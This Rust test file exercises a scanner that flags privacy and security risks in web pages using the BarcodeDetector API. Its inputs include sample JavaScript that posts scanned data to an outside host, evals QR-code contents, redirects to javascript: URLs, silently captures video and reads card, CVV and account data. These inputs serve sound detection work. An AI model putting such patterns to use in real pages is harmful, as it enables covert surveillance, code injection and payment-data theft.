use crate::barcode_detection_audit::*;

#[test]
fn no_barcode_no_issues() {
    assert!(analyze_barcode_detection("<html><body>hello</body></html>").is_empty());
}

#[test]
fn detects_api() {
    let body = r#"<script>const detector = new BarcodeDetector();</script>"#;
    let issues = analyze_barcode_detection(body);
    assert!(issues.contains(&BarcodeDetectionIssue::ApiDetected));
}

#[test]
fn detects_camera_access() {
    let body = r#"<script>
        const stream = await navigator.mediaDevices.getUserMedia({video: true});
        const detector = new BarcodeDetector();
    </script>"#;
    let issues = analyze_barcode_detection(body);
    assert!(issues.contains(&BarcodeDetectionIssue::CameraAccess));
}

#[test]
fn no_camera_without_media() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        const barcodes = await detector.detect(imageElement);
    </script>"#;
    let issues = analyze_barcode_detection(body);
    assert!(!issues.contains(&BarcodeDetectionIssue::CameraAccess));
}

#[test]
fn detects_data_exfiltration() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        const barcodes = await detector.detect(frame);
        fetch("/collect", {body: JSON.stringify(barcodes)});
    </script>"#;
    let issues = analyze_barcode_detection(body);
    assert!(issues.contains(&BarcodeDetectionIssue::DataExfiltration));
}

#[test]
fn no_exfil_without_fetch() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        const barcodes = await detector.detect(frame);
        console.log(barcodes);
    </script>"#;
    let issues = analyze_barcode_detection(body);
    assert!(!issues.contains(&BarcodeDetectionIssue::DataExfiltration));
}

#[test]
fn detects_continuous_scanning() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        setInterval(async () => {
            const barcodes = await detector.detect(video);
        }, 100);
    </script>"#;
    let issues = analyze_barcode_detection(body);
    assert!(issues.contains(&BarcodeDetectionIssue::ContinuousScanning));
}

#[test]
fn detects_raf_scanning() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        function scan() {
            detector.detect(video);
            requestAnimationFrame(scan);
        }
    </script>"#;
    let issues = analyze_barcode_detection(body);
    assert!(issues.contains(&BarcodeDetectionIssue::ContinuousScanning));
}

#[test]
fn detects_no_user_activation() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        detector.detect(video);
    </script>"#;
    let issues = analyze_barcode_detection(body);
    assert!(issues.contains(&BarcodeDetectionIssue::NoUserActivation));
}

#[test]
fn no_activation_issue_with_click() {
    let body = r#"<script>
        btn.addEventListener("click", async () => {
            const detector = new BarcodeDetector();
            const barcodes = await detector.detect(frame);
        });
    </script>"#;
    let issues = analyze_barcode_detection(body);
    assert!(!issues.contains(&BarcodeDetectionIssue::NoUserActivation));
}

#[test]
fn severity_exfil_highest() {
    assert_eq!(
        barcode_detection_severity(&BarcodeDetectionIssue::DataExfiltration),
        7.0
    );
}

#[test]
fn severity_detected_lowest() {
    assert_eq!(
        barcode_detection_severity(&BarcodeDetectionIssue::ApiDetected),
        2.5
    );
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![
        BarcodeDetectionIssue::ApiDetected,
        BarcodeDetectionIssue::CameraAccess,
    ];
    let mut seq = 0;
    let ops = barcode_detection_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(
        BarcodeDetectionIssue::ApiDetected.to_string(),
        "api_detected"
    );
    assert_eq!(
        BarcodeDetectionIssue::CameraAccess.to_string(),
        "camera_access"
    );
    assert_eq!(
        BarcodeDetectionIssue::DataExfiltration.to_string(),
        "data_exfiltration"
    );
    assert_eq!(
        BarcodeDetectionIssue::ContinuousScanning.to_string(),
        "continuous_scanning"
    );
    assert_eq!(
        BarcodeDetectionIssue::NoUserActivation.to_string(),
        "no_user_activation"
    );
}

#[test]
fn empty_body_no_issues() {
    assert!(analyze_barcode_detection("").is_empty());
}

#[test]
fn analyze_security_no_barcode_empty() {
    assert!(analyze_barcode_security("<html><body>no barcode</body></html>").is_empty());
}

#[test]
fn analyze_security_empty_body() {
    assert!(analyze_barcode_security("").is_empty());
}

#[test]
fn detects_barcode_fingerprinting_formats() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        const formats = await detector.getSupportedFormats();
        const fingerprint = formats.join(',');
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeFingerprinting));
}

#[test]
fn detects_barcode_fingerprinting_direct() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        const formats = detector.formats;
        sendFingerprint({barcode: formats, fingerprint: hash});
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeFingerprinting));
}

#[test]
fn no_fingerprinting_without_formats() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        const fingerprint = calculateHash();
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(!issues.contains(&BarcodeDetectionIssue::BarcodeFingerprinting));
}

#[test]
fn detects_cross_origin_postmessage() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        const barcodes = await detector.detect(img);
        window.parent.postMessage(barcodes, '*');
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeCrossOriginSharing));
}

#[test]
fn detects_cross_origin_explicit() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        fetch('https://cross-origin.com/collect', {
            method: 'POST',
            body: JSON.stringify(barcodes)
        });
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeCrossOriginSharing));
}

#[test]
fn detects_cross_origin_iframe() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        const iframe = document.querySelector('iframe');
        iframe.contentWindow.barcodes = await detector.detect(img);
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeCrossOriginSharing));
}

#[test]
fn detects_worker() {
    let body = r#"<script>
        const worker = new Worker('barcode-worker.js');
        const detector = new BarcodeDetector();
        worker.postMessage({cmd: 'detect', data: imageData});
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeInWorker));
}

#[test]
fn detects_shared_worker() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        const worker = new SharedWorker('barcode-processor.js');
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeInWorker));
}

#[test]
fn no_worker_without_worker() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        const barcodes = await detector.detect(img);
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(!issues.contains(&BarcodeDetectionIssue::BarcodeInWorker));
}

#[test]
fn detects_localstorage() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        const barcodes = await detector.detect(img);
        localStorage.setItem('scanned', JSON.stringify(barcodes));
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeWithStorage));
}

#[test]
fn detects_sessionstorage() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        sessionStorage.barcodes = JSON.stringify(await detector.detect(img));
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeWithStorage));
}

#[test]
fn detects_indexeddb() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        const db = await indexedDB.open('barcodes');
        const tx = db.transaction('scans', 'readwrite');
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeWithStorage));
}

#[test]
fn detects_qr_code_injection_underscore() {
    let body = r#"<script>
        const detector = new BarcodeDetector({formats: ['qr_code']});
        const barcodes = await detector.detect(img);
        const url = barcodes[0].rawValue;
        window.location = url;
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeQrCodeInjection));
}

#[test]
fn detects_qr_code_injection_hyphen() {
    let body = r#"<script>
        const detector = new BarcodeDetector({formats: ['qr-code']});
        const barcodes = await detector.detect(img);
        eval(barcodes[0].rawValue);
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeQrCodeInjection));
}

#[test]
fn detects_qr_code_javascript_scheme() {
    let body = r#"<script>
        const detector = new BarcodeDetector({formats: ['QR']});
        if (code.startsWith('javascript:')) {
            window.location.href = code;
        }
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeQrCodeInjection));
}

#[test]
fn no_qr_injection_without_url() {
    let body = r#"<script>
        const detector = new BarcodeDetector({formats: ['qr_code']});
        const barcodes = await detector.detect(img);
        console.log(barcodes);
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(!issues.contains(&BarcodeDetectionIssue::BarcodeQrCodeInjection));
}

#[test]
fn detects_payment_capture() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        const barcodes = await detector.detect(img);
        const payment = extractPaymentInfo(barcodes[0].rawValue);
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodePaymentDataCapture));
}

#[test]
fn detects_credit_card_capture() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        const credit = barcodes[0].rawValue;
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodePaymentDataCapture));
}

#[test]
fn detects_cvv_capture() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        const CVV = barcodes[0].rawValue.slice(-3);
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodePaymentDataCapture));
}

#[test]
fn detects_account_capture() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        const account = parseAccountNumber(barcodes[0].rawValue);
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodePaymentDataCapture));
}

#[test]
fn detects_card_capture() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        const card = barcodes[0].rawValue;
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodePaymentDataCapture));
}

#[test]
fn detects_geolocation() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        const pos = await navigator.geolocation.getCurrentPosition();
        const barcodes = await detector.detect(img);
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeLocationTracking));
}

#[test]
fn detects_get_current_position() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        navigator.geolocation.getCurrentPosition(pos => {
            logScan(barcodes, pos);
        });
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeLocationTracking));
}

#[test]
fn detects_location_generic() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        const location = {lat: 0, lng: 0};
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeLocationTracking));
}

#[test]
fn detects_without_permission() {
    let body = r#"<script>
        const detector = new BarcodeDetector();
        const barcodes = await detector.detect(img);
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeWithoutPermission));
}

#[test]
fn no_permission_issue_with_permissions() {
    let body = r#"<script>
        const status = await navigator.permissions.query({name: 'camera'});
        const detector = new BarcodeDetector();
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(!issues.contains(&BarcodeDetectionIssue::BarcodeWithoutPermission));
}

#[test]
fn detects_silent_display_none() {
    let body = r#"<script>
        const video = document.createElement('video');
        video.style.display = 'none';
        const detector = new BarcodeDetector();
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeSilentCapture));
}

#[test]
fn detects_silent_visibility_hidden() {
    let body = r#"<script>
        const video = document.createElement('video');
        video.style.visibility = 'hidden';
        const detector = new BarcodeDetector();
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeSilentCapture));
}

#[test]
fn detects_silent_opacity_zero() {
    let body = r#"<script>
        const video = document.createElement('video');
        video.style.opacity = '0';
        const detector = new BarcodeDetector();
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeSilentCapture));
}

#[test]
fn detects_multi_format_scan_three() {
    let body = r#"<script>
        const detector = new BarcodeDetector({
            formats: ['qr_code', 'ean_13', 'code_128']
        });
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeMultiFormatScan));
}

#[test]
fn detects_multi_format_scan_four() {
    let body = r#"<script>
        const detector = new BarcodeDetector({
            formats: ['qr_code', 'ean_13', 'data_matrix', 'aztec']
        });
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeMultiFormatScan));
}

#[test]
fn no_multi_format_with_two() {
    let body = r#"<script>
        const detector = new BarcodeDetector({
            formats: ['qr_code', 'ean_13']
        });
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(!issues.contains(&BarcodeDetectionIssue::BarcodeMultiFormatScan));
}

#[test]
fn barcode_security_to_operations_creates_entries() {
    let issues = vec![
        BarcodeDetectionIssue::BarcodeFingerprinting,
        BarcodeDetectionIssue::BarcodePaymentDataCapture,
    ];
    let mut seq = 0;
    let ops = barcode_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn severity_payment_highest() {
    assert_eq!(
        barcode_detection_severity(&BarcodeDetectionIssue::BarcodePaymentDataCapture),
        9.0
    );
}

#[test]
fn severity_silent_capture() {
    assert_eq!(
        barcode_detection_severity(&BarcodeDetectionIssue::BarcodeSilentCapture),
        8.5
    );
}

#[test]
fn severity_qr_injection() {
    assert_eq!(
        barcode_detection_severity(&BarcodeDetectionIssue::BarcodeQrCodeInjection),
        8.0
    );
}

#[test]
fn severity_location_tracking() {
    assert_eq!(
        barcode_detection_severity(&BarcodeDetectionIssue::BarcodeLocationTracking),
        7.5
    );
}

#[test]
fn severity_cross_origin() {
    assert_eq!(
        barcode_detection_severity(&BarcodeDetectionIssue::BarcodeCrossOriginSharing),
        7.0
    );
}

#[test]
fn severity_in_worker() {
    assert_eq!(
        barcode_detection_severity(&BarcodeDetectionIssue::BarcodeInWorker),
        6.0
    );
}

#[test]
fn severity_fingerprinting() {
    assert_eq!(
        barcode_detection_severity(&BarcodeDetectionIssue::BarcodeFingerprinting),
        5.5
    );
}

#[test]
fn severity_with_storage() {
    assert_eq!(
        barcode_detection_severity(&BarcodeDetectionIssue::BarcodeWithStorage),
        5.5
    );
}

#[test]
fn severity_multi_format() {
    assert_eq!(
        barcode_detection_severity(&BarcodeDetectionIssue::BarcodeMultiFormatScan),
        4.5
    );
}

#[test]
fn severity_without_permission() {
    assert_eq!(
        barcode_detection_severity(&BarcodeDetectionIssue::BarcodeWithoutPermission),
        4.0
    );
}

#[test]
fn display_new_variants() {
    assert_eq!(
        BarcodeDetectionIssue::BarcodeFingerprinting.to_string(),
        "barcode_fingerprinting"
    );
    assert_eq!(
        BarcodeDetectionIssue::BarcodeCrossOriginSharing.to_string(),
        "barcode_cross_origin_sharing"
    );
    assert_eq!(
        BarcodeDetectionIssue::BarcodeInWorker.to_string(),
        "barcode_in_worker"
    );
    assert_eq!(
        BarcodeDetectionIssue::BarcodeWithStorage.to_string(),
        "barcode_with_storage"
    );
    assert_eq!(
        BarcodeDetectionIssue::BarcodeQrCodeInjection.to_string(),
        "barcode_qr_code_injection"
    );
    assert_eq!(
        BarcodeDetectionIssue::BarcodePaymentDataCapture.to_string(),
        "barcode_payment_data_capture"
    );
    assert_eq!(
        BarcodeDetectionIssue::BarcodeLocationTracking.to_string(),
        "barcode_location_tracking"
    );
    assert_eq!(
        BarcodeDetectionIssue::BarcodeWithoutPermission.to_string(),
        "barcode_without_permission"
    );
    assert_eq!(
        BarcodeDetectionIssue::BarcodeSilentCapture.to_string(),
        "barcode_silent_capture"
    );
    assert_eq!(
        BarcodeDetectionIssue::BarcodeMultiFormatScan.to_string(),
        "barcode_multi_format_scan"
    );
}

#[test]
fn comprehensive_security_scan() {
    let body = r#"<script>
        const detector = new BarcodeDetector({
            formats: ['qr_code', 'ean_13', 'code_128', 'data_matrix']
        });
        const formats = await detector.getSupportedFormats();
        const fingerprint = formats.join(',');
        const worker = new Worker('scan.js');
        const barcodes = await detector.detect(img);
        localStorage.setItem('scans', JSON.stringify(barcodes));
        window.parent.postMessage(barcodes, '*');
        const payment = barcodes[0].rawValue;
        const pos = await navigator.geolocation.getCurrentPosition();
        video.style.display = 'none';
        if (barcodes[0].format === 'qr_code') {
            window.location = barcodes[0].rawValue;
        }
    </script>"#;
    let issues = analyze_barcode_security(body);
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeFingerprinting));
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeCrossOriginSharing));
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeInWorker));
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeWithStorage));
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeQrCodeInjection));
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodePaymentDataCapture));
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeLocationTracking));
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeWithoutPermission));
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeSilentCapture));
    assert!(issues.contains(&BarcodeDetectionIssue::BarcodeMultiFormatScan));
}
